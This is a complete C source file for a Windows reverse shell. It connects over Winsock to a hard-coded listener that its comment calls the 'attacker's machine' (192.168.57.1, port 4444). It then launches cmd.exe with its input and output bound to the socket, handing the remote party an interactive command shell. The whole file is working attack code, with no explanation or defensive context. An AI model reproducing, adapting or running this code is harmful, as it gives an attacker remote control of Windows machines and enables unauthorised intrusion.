#include <winsock2.h>
#include "Ws2tcpip.h"
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#pragma comment(lib, "ws2_32")

int main(int argc, char* argv[])
{

	WSADATA wsaData;
	SOCKET wSock;
	struct sockaddr_in hax;


	// listener ip, port on attacker's machine
	const char* ip = "192.168.57.1";
	short port = 4444;

	// init socket lib
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		fprintf(stderr, "Error WSAStartup\n");
		exit(-1);
	}

	// create socket
	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	inet_pton(AF_INET, ip, &hax.sin_addr);
	hax.sin_family = AF_INET;
	hax.sin_port = htons(port);

	if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL) != 0) {
		fprintf(stderr, "Error connect\n");
		exit(-1);
	}

		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		WCHAR szCmdLine[] = L"C:\\Windows\\System32\\cmd.exe";

		si.dwFlags = STARTF_USESTDHANDLES;
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;

		// Start the child process. 
		if (!CreateProcessW(NULL, szCmdLine,
			NULL, NULL, TRUE, 0, NULL,
			NULL, &si, &pi))
		{
			printf("CreateProcess failed (%d).\n", GetLastError());
			return 0;
		}

		// Wait until child process exits.
		WaitForSingleObject(pi.hProcess, INFINITE);

		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);


}